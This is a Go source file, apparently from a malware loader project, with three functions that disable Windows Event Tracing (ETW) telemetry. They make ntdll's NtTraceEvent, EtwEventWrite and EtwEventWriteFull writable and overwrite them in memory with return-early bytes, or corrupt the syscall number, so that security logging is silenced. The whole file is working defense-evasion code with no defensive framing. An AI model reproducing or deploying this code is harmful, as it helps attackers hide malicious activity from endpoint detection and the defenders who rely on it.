package bypass

import (
	"log"
	"syscall"
	"unsafe"

	"github.com/mszatanik/goloader/pkg/win32"
)

func Patch_NtTraceEvent() {
	log.Println("[*] attepmting to patch ETW NtTraceEvent")

	hNtdll, err := syscall.LoadLibrary("ntdll")
	if err != nil {
		log.Fatalln("[-] can't load ntdll", err)
	}
	oldprotect := 0
	temp := 0
	patch_bytes := []byte{0x90, 0x90, 0x48, 0x31, 0xC0, 0xC3}

	pNtTraceEventAaddress, _ := syscall.GetProcAddress(syscall.Handle(hNtdll), "NtTraceEvent")

	log.Printf("[*] setting protection of: %d to: PAGE_EXECUTE_READWRITE\r\n", pNtTraceEventAaddress)
	err = win32.VirtualProtectCall(
		pNtTraceEventAaddress,
		uintptr(len(patch_bytes)),
		win32.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if err != nil {
		log.Fatalln("[-] VirtualProtectCall failed", err)
	}

	log.Printf("[*] moving %d bytes (0x90, 0x90, 0x48, 0x31, 0xC0, 0xC3) to %d", uintptr(len(patch_bytes)), pNtTraceEventAaddress)
	win32.RtlMoveMemoryCall(pNtTraceEventAaddress, (uintptr)(unsafe.Pointer(&patch_bytes[0])), uintptr(len(patch_bytes)))
	if err != nil {
		log.Fatalln("[-] RtlMoveMemoryCall failed", err)
	}

	log.Printf("[*] setting protection of: %d to: %b\r\n", pNtTraceEventAaddress, oldprotect)
	win32.VirtualProtectCall(
		pNtTraceEventAaddress,
		uintptr(len(patch_bytes)),
		uintptr(oldprotect),
		uintptr(unsafe.Pointer(&temp)),
	)
	if err != nil {
		log.Fatalln("[-] VirtualProtectCall failed", err)
	}

	log.Println("[+] ETW patched")
}

func Patch_NtTraceEvent2() {
	log.Println("[*] attepmting to patch ETW NtTraceEvent")

	var (
		oldprotect                 byte    = 0x00
		x64_SYSCALL_STUB_SIZE      uintptr = 0x20
		x64_RET_INSTRUCTION_OPCODE byte    = 0xC3
		x64_MOV_INSTRUCTION_OPCODE byte    = 0xB8
		DWORD                      uint32
	)

	hNtdll, err := syscall.LoadLibrary("ntdll")
	if err != nil {
		log.Fatalln("[-] can't load ntdll", err)
	}

	NtTraceEventAaddress, _ := syscall.GetProcAddress(syscall.Handle(hNtdll), "NtTraceEvent")
	pNtTraceEventAaddress := unsafe.Pointer(NtTraceEventAaddress)

	// Search for NtTraceEvent's SSN pointer
	for i := uintptr(0); i < x64_SYSCALL_STUB_SIZE; i++ {
		addr := uintptr(pNtTraceEventAaddress) + i
		value := *(*byte)(unsafe.Pointer(addr))
		if value == x64_MOV_INSTRUCTION_OPCODE {
			// Set the pointer to NtTraceEvent's SSN and break
			NtTraceEventAaddress = addr + 1
			break
		}

		// panic on ret or syscall
		if value == x64_RET_INSTRUCTION_OPCODE || value == 0x0F || value == 0x05 {
			log.Fatalln("[-] did not find opcode")
		}
	}
	log.Printf("[*] setting protection of: %d to: PAGE_EXECUTE_READWRITE\r\n", NtTraceEventAaddress)
	err = win32.VirtualProtectCall(
		NtTraceEventAaddress,
		unsafe.Sizeof(DWORD),
		win32.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if err != nil {
		log.Fatalln("[-] VirtualProtectCall failed", err)
	}

	// patch
	log.Printf("[*] patching ETW at %d with 0x000000FF\r\n", NtTraceEventAaddress)
	ptr := (*uint32)(unsafe.Pointer(NtTraceEventAaddress)) // Convert the address to a pointer of appropriate type using unsafe.Pointer
	*ptr = 0x000000FF                                      // Assign the new value through the pointer

	log.Printf("[*] setting protection of: %d to: %b\r\n", NtTraceEventAaddress, oldprotect)
	win32.VirtualProtectCall(
		NtTraceEventAaddress,
		unsafe.Sizeof(DWORD),
		uintptr(oldprotect),
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if err != nil {
		log.Fatalln("[-] VirtualProtectCall failed", err)
	}

	log.Println("[+] ETW patched")
}

func Patch_EtwEventWrite() {
	log.Println("[*] attepmting to patch ETW EtwEventWrite and EtwEventWriteFull")

	var (
		patch_bytes []byte = []byte{
			0x33, 0xC0, // xor eax, eax
			0xC3, // ret
		}
		oldprotect       byte     = 0x00
		temp             byte     = 0x00
		functionsToPatch []string = []string{
			"EtwEventWrite",
			//"EtwEventWriteEx", // not needed ?
			"EtwEventWriteFull",
		}
	)
	hNtdll, err := syscall.LoadLibrary("ntdll")
	if err != nil {
		log.Fatalln("[-] can't load ntdll", err)
	}

	for _, fnName := range functionsToPatch {
		pEtwEventWriteAddress, _ := syscall.GetProcAddress(syscall.Handle(hNtdll), fnName)

		log.Printf("[*] setting protection of: %d to: PAGE_EXECUTE_READWRITE\r\n", pEtwEventWriteAddress)
		err = win32.VirtualProtectCall(
			pEtwEventWriteAddress,
			uintptr(len(patch_bytes)),
			win32.PAGE_EXECUTE_READWRITE,
			uintptr(unsafe.Pointer(&oldprotect)),
		)
		if err != nil {
			log.Fatalln("[-] VirtualProtectCall failed", err)
		}

		log.Printf("[*] moving %d bytes to %d", uintptr(len(patch_bytes)), pEtwEventWriteAddress)
		win32.RtlMoveMemoryCall(
			pEtwEventWriteAddress,
			(uintptr)(unsafe.Pointer(&patch_bytes[0])),
			uintptr(len(patch_bytes)),
		)
		if err != nil {
			log.Fatalln("[-] RtlMoveMemoryCall failed", err)
		}

		log.Printf("[*] setting protection of: %d to: %b\r\n", pEtwEventWriteAddress, oldprotect)
		win32.VirtualProtectCall(
			pEtwEventWriteAddress,
			uintptr(len(patch_bytes)),
			uintptr(oldprotect),
			uintptr(unsafe.Pointer(&temp)),
		)
		if err != nil {
			log.Fatalln("[-] VirtualProtectCall failed", err)
		}
		log.Printf("[+] %s patched\r\n", fnName)
	}

	log.Println("[+] ETW patched")
}
